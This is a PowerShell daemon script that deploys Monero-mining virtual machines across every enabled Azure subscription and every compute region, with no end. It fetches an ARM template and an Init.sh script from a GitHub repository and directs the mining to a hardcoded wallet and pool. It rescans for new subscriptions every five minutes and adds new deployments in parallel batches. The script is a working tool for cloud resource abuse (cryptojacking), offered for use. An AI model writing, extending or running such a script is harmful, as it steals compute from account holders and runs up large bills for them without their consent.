<#
.SYNOPSIS
    Daemon to deploy a mining ARM template to all locations in all Azure subscriptions.
.DESCRIPTION
    This script runs continuously in Cloud Shell. It discovers all available subscriptions,
    iterates through their supported locations, and deploys a VM-based mining infrastructure
    using a unique name for each deployment to avoid conflicts. It includes robust error handling and parallel execution.
.NOTES
    File Name   : Deploy-MiningDaemon.ps1
    Requires    : Azure Cloud Shell or PowerShell with Az module
    Author      : Auto-generated & corrected
#>

# ============= CONFIGURATION =============
# The ARM template to deploy (GitHub raw URL)
$TemplateUri = "https://raw.githubusercontent.com/myhomemail565-gif/cryptocloud/master/vm/azure/arm/template.json"

# --- Custom Script & VM Settings ---
# The custom script to execute on each VM
$CustomScriptUri = "https://raw.githubusercontent.com/myhomemail565-gif/cryptocloud/refs/heads/master/Init.sh"
# The VM size (SKU) to deploy. Example: "Standard_F2s_v2"
$VmSize = "Standart_F2as_v6"
# Number of VMs to create in each deployment
$VmInstanceCount = 2

# Your primary wallet address (overrides template defaults if needed)
$UserWallet = "85fHndEnn5geDRAuWvnrvTR8PE8KmztiQev95rDoQqvyAdibnfSGQX2Ww4V4XadbX6VxbZ1Q2uWYcUWjhqxseojY4o2GTeb"
# Your primary mining pool
$UserPool = "us-west.minexmr.com:4444"

# Prefix for created Resource Groups
$ResourceGroupPrefix = "crypto"
# Deployment concurrency and timing controls
$LocationBatchSize = 5 # Number of locations to process in parallel per subscription
$SecondsBetweenSubscriptionScans = 300 # How often to rescan for new subscriptions (5 minutes)


# ============= FUNCTIONS =============
function Get-UniqueDeploymentIdentifier {
    param([string]$SubscriptionId, [string]$Location)
    # Creates a short, unique string based on sub ID, location, and time
    $subHash = $SubscriptionId.Substring(0, 8).ToLower()
    $locCode = $Location.Replace(' ', '').Replace('-', '').ToLower().Substring(0, 6)
    $timeStamp = (Get-Date).ToString("HHmm")
    $random = Get-Random -Minimum 100 -Maximum 999
    return "$subHash$locCode$timeStamp$random"
}

function Test-AzResourceProvider {
    param([string]$ProviderNamespace, [string]$SubscriptionId)
    # Checks if a required resource provider is registered
    Set-AzContext -Subscription $SubscriptionId | Out-Null
    $provider = Get-AzResourceProvider -ProviderNamespace $ProviderNamespace -ErrorAction SilentlyContinue | Where-Object { $_.RegistrationState -eq "Registered" }
    if (-not $provider) {
        Write-Host "  Warning: Provider '$ProviderNamespace' not registered. Attempting registration..." -ForegroundColor Yellow
        try {
            Register-AzResourceProvider -ProviderNamespace $ProviderNamespace -ErrorAction Stop | Out-Null
            Write-Host "  Provider registration initiated." -ForegroundColor Green
            # Wait a moment for registration to propagate
            Start-Sleep -Seconds 10
            return $true
        }
        catch {
            Write-Host "  Could not register provider: $_" -ForegroundColor Red
            return $false
        }
    }
    return $true
}

function Resolve-DeploymentError {
    param($ErrorRecord, $ResourceGroupName, $Location)
    # Analyzes common errors and suggests actions
    $message = $ErrorRecord.Exception.Message
    Write-Host "  Error Analysis: $message" -ForegroundColor Red

    if ($message -like "*SkuNotAvailable*" -or $message -like "*not available in location*") {
        Write-Host "  Action: The VM size (SKU) is not available in $Location. Skipping this location." -ForegroundColor Yellow
        return "SKIP_LOCATION"
    }
    if ($message -like "*QuotaExceeded*" -or $message -like "*OperationNotAllowed*") {
        Write-Host "  Action: Subscription quota exceeded for $Location. You may need to request a quota increase." -ForegroundColor Yellow
        return "QUOTA_ERROR"
    }
    if ($message -like "*NoRegisteredProviderFound*" -or $message -like "*MissingSubscriptionRegistration*") {
        Write-Host "  Action: Required resource provider not registered. This may resolve on retry." -ForegroundColor Yellow
        return "RETRY"
    }
    if ($message -like "*InvalidDeploymentLocation*") {
        Write-Host "  Action: Deployment name conflict. Generating a new unique name for retry." -ForegroundColor Yellow
        return "NEW_NAME"
    }
    if ($message -like "*RequestDisallowedByPolicy*") {
        Write-Host "  Action: Deployment blocked by Azure Policy. Check subscription policies." -ForegroundColor Yellow
        return "POLICY_BLOCK"
    }

    Write-Host "  Action: Unhandled error type. Deployment failed." -ForegroundColor Red
    return "FAIL"
}

function Invoke-SafeDeployment {
    param($SubscriptionContext, $Location, $TemplateParams, $MaxRetries = 2)
    # Core deployment function with retry logic
    $deploymentResult = $null
    $currentTry = 0
    $uniqueId = Get-UniqueDeploymentIdentifier -SubscriptionId $SubscriptionContext.Subscription.Id -Location $Location
    $baseRgName = "$ResourceGroupPrefix-$($Location.ToLower().Replace(' ', '-').Replace('--', '-'))-$uniqueId"

    while ($currentTry -le $MaxRetries) {
        $currentTry++
        $rgName = $baseRgName
        if ($currentTry -gt 1) {
            $rgName = "$baseRgName-retry$currentTry"
            Write-Host "  Retry attempt $currentTry of $MaxRetries for $Location..." -ForegroundColor Yellow
        }

        Set-AzContext -Subscription $SubscriptionContext.Subscription.Id -Tenant $SubscriptionContext.Tenant.Id | Out-Null

        try {
            # 1. Create or get resource group
            $rg = Get-AzResourceGroup -Name $rgName -ErrorAction SilentlyContinue
            if (-not $rg) {
                Write-Host "  Creating Resource Group: $rgName" -ForegroundColor Gray
                $rg = New-AzResourceGroup -Name $rgName -Location $Location -Tag @{
                    DeployedBy     = "MiningDaemon";
                    DeploymentTime = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss");
                    Subscription   = $SubscriptionContext.Subscription.Name;
                    TemplateUri    = [System.IO.Path]::GetFileName($TemplateUri);
                } -Force
                Start-Sleep -Seconds 5
            }

            # 2. Validate core resource providers are registered
            $requiredProviders = @("Microsoft.Compute", "Microsoft.Storage", "Microsoft.Network")
            $allProvidersOk = $true
            foreach ($provider in $requiredProviders) {
                if (-not (Test-AzResourceProvider -ProviderNamespace $provider -SubscriptionId $SubscriptionContext.Subscription.Id)) {
                    $allProvidersOk = $false
                }
            }
            if (-not $allProvidersOk) {
                throw New-Object System.Exception("Required resource providers not available.")
            }

            # 3. Execute deployment
            Write-Host "  Starting ARM deployment to $rgName..." -ForegroundColor Gray
            $deployment = New-AzResourceGroupDeployment -ResourceGroupName $rgName -TemplateUri $TemplateUri -Name "deploy-$uniqueId" -Location $Location @TemplateParams -Mode Incremental -ErrorAction Stop

            Write-Host "  SUCCESS: Deployment to $Location completed." -ForegroundColor Green
            $deploymentResult = @{ Success = $true; ResourceGroup = $rgName; Outputs = $deployment.Outputs }
            break
        }
        catch {
            $errorAction = Resolve-DeploymentError -ErrorRecord $_ -ResourceGroupName $rgName -Location $Location
            switch ($errorAction) {
                "SKIP_LOCATION" {
                    $deploymentResult = @{ Success = $false; Status = "Skipped"; Reason = "SKU not available" }
                    return $deploymentResult
                }
                "QUOTA_ERROR" {
                    $deploymentResult = @{ Success = $false; Status = "Failed"; Reason = "Quota exceeded" }
                    return $deploymentResult
                }
                "POLICY_BLOCK" {
                    $deploymentResult = @{ Success = $false; Status = "Blocked"; Reason = "Policy violation" }
                    return $deploymentResult
                }
                "NEW_NAME" {
                    $uniqueId = Get-UniqueDeploymentIdentifier -SubscriptionId $SubscriptionContext.Subscription.Id -Location $Location
                    $baseRgName = "$ResourceGroupPrefix-$($Location.ToLower().Replace(' ', '-').Replace('--', '-'))-$uniqueId"
                    continue
                }
                default {
                    if ($currentTry -lt $MaxRetries) {
                        Write-Host "  Waiting 30 seconds before retry..." -ForegroundColor Gray
                        Start-Sleep -Seconds 30
                        continue
                    }
                }
            }
            $deploymentResult = @{ Success = $false; Status = "Failed"; Reason = "Max retries exceeded"; Error = $_.Exception.Message }
        }
    }
    return $deploymentResult
}


# ============= MAIN DAEMON LOOP =============
Write-Host "=================================================================================" -ForegroundColor Cyan
Write-Host "AZURE MINING DEPLOYMENT DAEMON" -ForegroundColor Yellow
Write-Host "Started at: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -ForegroundColor Cyan
Write-Host "Template: $TemplateUri" -ForegroundColor Cyan
Write-Host "VM Size: $VmSize | Instances: $VmInstanceCount" -ForegroundColor Cyan
Write-Host "=================================================================================" -ForegroundColor Cyan
Write-Host "`n"

# Ensure we are connected to Azure
try {
    Connect-AzAccount -Identity -ErrorAction SilentlyContinue | Out-Null
    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Connected via Managed Identity." -ForegroundColor Green
}
catch {
    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Managed Identity not available. Attempting interactive login." -ForegroundColor Yellow
    Connect-AzAccount | Out-Null
}

$daemonIteration = 0

# Define functions that need to be available in the job scope
$jobFunctions = @"
$(Get-Content Function:Get-UniqueDeploymentIdentifier)
$(Get-Content Function:Test-AzResourceProvider)
$(Get-Content Function:Resolve-DeploymentError)
$(Get-Content Function:Invoke-SafeDeployment)
"@

while ($true) {
    $daemonIteration++
    $iterationLog = @() # Use a log for the current iteration
    Write-Host "`n[$(Get-Date -Format 'HH:mm:ss')] Daemon Iteration: $daemonIteration" -ForegroundColor Magenta
    Write-Host "Scanning for subscriptions..." -ForegroundColor Gray
    $allSubscriptions = Get-AzSubscription -ErrorAction SilentlyContinue | Where-Object { $_.State -eq 'Enabled' }
    Write-Host "Found $($allSubscriptions.Count) enabled subscriptions." -ForegroundColor Green

    foreach ($sub in $allSubscriptions) {
        Write-Host "`n--- Processing Subscription: $($sub.Name) ($($sub.Id)) ---" -ForegroundColor White -BackgroundColor DarkBlue
        $subContext = Get-AzContext -SubscriptionId $sub.Id -ErrorAction SilentlyContinue
        if (-not $subContext) {
            Set-AzContext -Subscription $sub.Id | Out-Null
            $subContext = Get-AzContext
        }

        # Get available locations for Compute services
        $locations = @()
        try {
            $locations = (Get-AzLocation | Where-Object { $_.Providers -contains "Microsoft.Compute" -and $_.Location -notlike "*stage*" -and $_.Location -notlike "*test*" }).Location | Sort-Object | Get-Unique
        }
        catch {
            Write-Host "  Could not fetch locations for subscription. Skipping." -ForegroundColor Red
            continue
        }
        if ($locations.Count -eq 0) {
            Write-Host "  No suitable locations found in this subscription." -ForegroundColor Yellow
            continue
        }
        Write-Host "  Targeting $($locations.Count) locations." -ForegroundColor Cyan

        # Prepare template parameters
        $templateParameters = @{
            user_wallet     = $UserWallet
            user_pool_port  = $UserPool
            vmSize          = $VmSize
            instanceCount   = $VmInstanceCount
            customScriptUri = $CustomScriptUri
        }

        # Process locations in parallel batches
        for ($i = 0; $i -lt $locations.Count; $i += $LocationBatchSize) {
            $batchLocations = $locations[$i..($i + $LocationBatchSize - 1)]
            $jobs = @()

            Write-Host "  Starting a new batch of $($batchLocations.Count) locations..." -ForegroundColor Cyan

            foreach ($loc in $batchLocations) {
                Write-Host "    Queueing deployment for location: $loc" -ForegroundColor Gray
                # Use -ArgumentList to pass variables correctly to the job
                $job = Start-Job -Name "Deploy-$loc" -ArgumentList @($subContext, $loc, $templateParameters, $sub, $TemplateUri) -InitializationScript {
                    # Pass functions to the job's scope
                    $using:jobFunctions | Invoke-Expression
                } -ScriptBlock {
                    # Receive arguments passed via -ArgumentList
                    param($subContext, $loc, $templateParameters, $sub, $TemplateUri)

                    # Connect to Azure within the job's context using the inherited identity
                    Connect-AzAccount -Identity | Out-Null

                    # Execute the deployment function
                    $result = Invoke-SafeDeployment -SubscriptionContext $subContext -Location $loc -TemplateParams $templateParameters -MaxRetries 2

                    # Return a rich object with all necessary info
                    return [PSCustomObject]@{
                        Timestamp     = Get-Date
                        Subscription  = $sub.Name
                        Location      = $loc
                        Success       = $result.Success
                        ResourceGroup = $result.ResourceGroup
                        Status        = $result.Status
                        Reason        = $result.Reason
                        Error         = $result.Error
                    }
                }
                $jobs += $job
            }

            Write-Host "  Waiting for batch to complete..." -ForegroundColor Gray
            $jobs | Wait-Job | Out-Null

            # Collect results and clean up jobs
            foreach ($job in $jobs) {
                $result = Receive-Job -Job $job
                if ($job.State -eq 'Failed') {
                    Write-Host "    Job for $($job.Name) failed: $($job.ChildJobs[0].JobStateInfo.Reason.Message)" -ForegroundColor Red
                }
                $iterationLog += $result
                Remove-Job -Job $job
            }
            Write-Host "  Batch complete." -ForegroundColor Green
        }
        Write-Host "--- Finished subscription: $($sub.Name) ---" -ForegroundColor Green
    }

    # Summary of this iteration
    if ($iterationLog.Count -gt 0) {
        $successCount = ($iterationLog | Where-Object { $_.Success -eq $true }).Count
        $failCount = ($iterationLog | Where-Object { $_.Success -eq $false -and $_.Status -ne 'Skipped' }).Count
        $skipCount = ($iterationLog | Where-Object { $_.Status -eq 'Skipped' }).Count

        Write-Host "`n[$(Get-Date -Format 'HH:mm:ss')] Iteration $daemonIteration Complete." -ForegroundColor Magenta
        Write-Host "  Total deployments processed in this run: $($iterationLog.Count)" -ForegroundColor Cyan
        Write-Host "  Successful: $successCount" -ForegroundColor Green
        Write-Host "  Failed/Blocked: $failCount" -ForegroundColor $(if ($failCount -gt 0) { 'Red' } else { 'Gray' })
        Write-Host "  Skipped (e.g., SKU not available): $skipCount" -ForegroundColor Yellow

        # Save log to Cloud Shell persistent storage
        $logPath = "$HOME/clouddrive/MiningDeployments_$(Get-Date -Format 'yyyyMMdd').csv"
        $iterationLog | Export-Csv -Path $logPath -NoTypeInformation -Append
        Write-Host "  Log saved to: $logPath" -ForegroundColor Gray
    }
    else {
        Write-Host "`n[$(Get-Date -Format 'HH:mm:ss')] Iteration $daemonIteration Complete. No locations were processed." -ForegroundColor Yellow
    }

    Write-Host "`n[$(Get-Date -Format 'HH:mm:ss')] Daemon sleeping for $SecondsBetweenSubscriptionScans seconds..." -ForegroundColor DarkGray
    Write-Host "=================================================================================" -ForegroundColor DarkGray
    Start-Sleep -Seconds $SecondsBetweenSubscriptionScans
}
